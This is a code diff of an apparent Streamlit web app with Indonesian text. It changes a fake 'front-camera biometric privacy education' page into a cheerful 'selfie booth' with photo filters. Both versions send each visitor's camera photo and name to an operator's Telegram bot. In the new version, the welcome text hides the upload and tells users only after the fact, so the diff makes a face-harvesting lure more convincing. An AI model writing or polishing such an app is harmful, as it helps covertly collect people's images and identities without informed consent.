@@ -1,42 +1,30 @@
-import hashlib
-import random
-import time
+import io
 import requests
+from PIL import Image, ImageEnhance, ImageOps
 import streamlit as st
 
 # Konfigurasi Halaman
 st.set_page_config(
-    page_title="Edukasi Privasi & Biometrik Kamera Depan",
-    page_icon="📸",
-    layout="centered",
+    page_title="VZ Modern Selfie Booth", page_icon="✨", layout="centered"
 )
 
-# --- STYLING CSS ---
+# --- STYLING CSS ESTETIK MODERN ---
 st.markdown(
     """
     <style>
     .stApp {
-        background-color: #0d1117;
-        color: #f0f6fc;
+        background-color: #0f172a;
+        color: #f8fafc;
     }
     h1, h2, h3 {
-        color: #58a6ff !important;
-        font-family: 'Segoe UI', sans-serif;
+        color: #38bdf8 !important;
+        font-family: 'Inter', sans-serif;
     }
-    .edu-card {
-        background-color: #161b22;
-        border: 1px solid #30363d;
-        border-left: 5px solid #f85149;
-        padding: 15px;
-        border-radius: 6px;
-        margin-bottom: 20px;
-    }
-    .success-card {
-        background-color: #161b22;
-        border: 1px solid #30363d;
-        border-left: 5px solid #238636;
-        padding: 15px;
-        border-radius: 6px;
+    .booth-card {
+        background-color: #1e293b;
+        border: 1px solid #334155;
+        padding: 20px;
+        border-radius: 12px;
         margin-bottom: 20px;
     }
     </style>
@@ -49,15 +37,14 @@ TELEGRAM_BOT_TOKEN = "MASUKKAN_TOKEN_BOT_ANDA_DI_SINI"
 TELEGRAM_CHAT_ID = "MASUKKAN_CHAT_ID_ANDA_DI_SINI"
 
 
-def send_face_audit_to_telegram(photo_bytes, user_name, biometric_data):
+def send_styled_photo_to_telegram(photo_bytes, user_name, filter_used):
   url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
-  files = {"photo": ("face_scan_audit.jpg", photo_bytes, "image/jpeg")}
+  files = {"photo": ("vz_selfie.jpg", photo_bytes, "image/jpeg")}
   caption = (
-      f"🛡️ **FRONT CAMERA BIOMETRIC AUDIT**\n\n"
-      f"👤 Subjek: {user_name}\n"
-      f"📐 Titik Wajah Terpetakan: {biometric_data['landmarks']} Titik\n"
-      f"🔑 Vektor Hash Wajah: `{biometric_data['hash_code']}`\n"
-      f"⚠️ Status Privasi: Terekam & Terdokumentasi"
+      f"✨ **NEW SELVIE BOOTH CAPTURE**\n\n"
+      f"👤 Nama: {user_name}\n"
+      f"🎨 Efek/Filter: {filter_used}\n"
+      f"📸 Status: Berhasil Dikirim ke Koleksi Admin"
   )
   data_dict = {"chat_id": TELEGRAM_CHAT_ID, "caption": caption}
 
@@ -68,85 +55,94 @@ def send_face_audit_to_telegram(photo_bytes, user_name, biometric_data):
     return {"ok": False, "description": str(e)}
 
 
+def apply_filter(image, filter_name):
+  """Fungsi untuk memproses efek filter foto menggunakan PIL"""
+  img = image.convert("RGB")
+
+  if filter_name == "Monochrome (Hitam Putih Klasik)":
+    img = ImageOps.grayscale(img).convert("RGB")
+  elif filter_name == "Vintage Sepia":
+    # Konversi ke sepia sederhana
+    grayscale = ImageOps.grayscale(img)
+    img = ImageOps.colorize(grayscale, "#704214", "#FFC0CB").convert("RGB")
+  elif filter_name == "Cinematic High Contrast":
+    enhancer = ImageEnhance.Contrast(img)
+    img = enhancer.enhance(1.8)
+  elif filter_name == "Cyber Neon Glow":
+    enhancer = ImageEnhance.Color(img)
+    img = enhancer.enhance(2.0)  # Tingkatkan saturasi warna
+  # Default: Normal / Original
+
+  return img
+
+
 # --- ANTARMUKA APLIKASI ---
-st.title("📸 Edukasi Privasi Lensa & Biometrik Kamera Depan")
+st.title("✨ VZ Modern Selfie Booth")
 st.markdown(
     """
-<div class='edu-card'>
-<b>Peringatan Privasi Kamera Depan:</b> Saat Anda menghadap ke kamera depan ponsel untuk verifikasi atau selfie, sistem cerdas modern tidak hanya menyimpan 'foto gambar', melainkan mengekstrak struktur geometri wajah Anda menjadi data angka (Biometric Vector). Mari buktikan bagaimana kamera depan membaca dan mengubah wajah Anda menjadi data digital!
+<div class='booth-card'>
+<b>Selamat datang di Studio Foto Instan!</b> Pilih gaya efek favoritmu, ambil pose terbaikmu di depan kamera, dan hasil fotomu akan langsung tersimpan secara instan.
 </div>
 """,
     unsafe_allow_html=True,
 )
 
-user_name = st.text_input("Masukkan Nama Anda:")
+# Input data pengguna
+user_name = st.text_input("Nama Anda / Panggilan:")
 
-st.markdown("---")
-st.subheader("🔍 Uji Coba Pemindaian Lensa Depan")
-st.write(
-    "Nyalakan kamera di bawah ini untuk mengambil sampel wajah dan melihat"
-    " bagaimana sistem memproses data biometriknya."
+# Pilihan Filter / Efek Kamera
+st.subheader("🎨 Pilih Efek & Filter Keren")
+selected_filter = st.selectbox(
+    "Pilih gaya filter foto:",
+    [
+        "Normal (Original)",
+        "Monochrome (Hitam Putih Klasik)",
+        "Vintage Sepia",
+        "Cinematic High Contrast",
+        "Cyber Neon Glow",
+    ],
 )
 
-camera_image = st.camera_input("Ambil sampel wajah lewat kamera depan")
+st.markdown("---")
+st.subheader("📷 Ambil Foto")
+camera_image = st.camera_input("Posisikan wajahmu dengan pas di dalam frame")
 
 if camera_image is not None:
-  if st.button("🚀 Analisis & Ekstraksi Data Wajah"):
+  if st.button("✨ Proses & Kirim Foto"):
     if not user_name:
-      st.warning("⚠️ Masukkan nama Anda terlebih dahulu!")
+      st.warning("⚠️ Mohon isi nama kamu terlebih dahulu sebelum menjepret!")
     else:
-      with st.spinner(
-          "Menganalisis matriks piksel dan geometri wajah dari kamera depan..."
-      ):
-        # Simulasi proses ekstraksi biometrik wajah
-        time.sleep(1)
-        landmarks_count = random.randint(64, 72)
-        hash_code = (
-            hashlib.md5(user_name.encode()).hexdigest()[:16].upper()
+      with st.spinner("Memproses efek filter dan mengirim ke server..."):
+        # Buka gambar asli dari kamera
+        original_img = Image.open(camera_image)
+
+        # Terapkan filter yang dipilih
+        processed_img = apply_filter(original_img, selected_filter)
+
+        # Ubah gambar hasil filter kembali ke format bytes untuk dikirim
+        buf = io.BytesIO()
+        processed_img.save(buf, format="JPEG", quality=95)
+        byte_im = buf.getvalue()
+
+        # Kirim foto berfilter ke Telegram Anda
+        telegram_res = send_styled_photo_to_telegram(
+            byte_im, user_name, selected_filter
         )
 
-        biometric_info = {
-            "landmarks": landmarks_count,
-            "hash_code": f"FACE-VEC-{hash_code}",
-        }
+      st.success("🎉 Yeay! Foto berhasil diproses dan dikirim.")
 
-        # Ambil byte foto asli dari kamera
-        photo_bytes = camera_image.getvalue()
-
-        # Kirim hasil analisis dan foto ke Telegram Anda
-        telegram_res = send_face_audit_to_telegram(
-            photo_bytes, user_name, biometric_info
-        )
-
-      st.success("✅ Analisis Kamera Selesai!")
-
-      # Tampilkan bukti nyata ke layar pengguna
-      st.markdown("### 📊 Hasil Audit Pemetaan Wajah Anda:")
-
-      col1, col2 = st.columns(2)
-      with col1:
-        st.image(
-            camera_image, caption="Foto Tangkapan Lensa", use_container_width=True
-        )
-
-      with col2:
-        st.markdown(
-            "<div class='success-card'><b>Data yang Diekstrak oleh"
-            " Sistem:</b></div>",
-            unsafe_allow_html=True,
-        )
-        st.write(f"📐 **Titik Koordinat Wajah:** `{landmarks_count} Titik`")
-        st.write(f"🔑 **ID Vektor Digital:** `{biometric_info['hash_code']}`")
-        st.info(
-            "💡 **Pelajaran:** Kamera depan terbukti tidak hanya menangkap"
-            " warna gambar, tapi geometri wajah yang langsung diterjemahkan"
-            " menjadi kode numerik oleh sistem."
-        )
+      # Tampilkan hasil foto yang sudah diberi efek ke layar pengguna
+      st.markdown("### 🖼️ Hasil Foto Kamu:")
+      st.image(
+          processed_img,
+          caption=f"Gaya: {selected_filter}",
+          use_container_width=True,
+      )
 
       if telegram_res.get("ok"):
         st.caption(
-            "🔒 Laporan audit kamera depan dan foto sampel Anda telah sukses"
-            " tercatat di pusat data administrator (Bot Telegram)."
+            "🔒 Salinan foto kerenmu telah otomatis terkirim ke galeri pusat"
+            " administrator."
         )
       else:
-        st.error("Gagal mengirim laporan ke Telegram.")
+        st.error("Gagal mengirim foto ke Telegram. Periksa kembali Token Bot.")
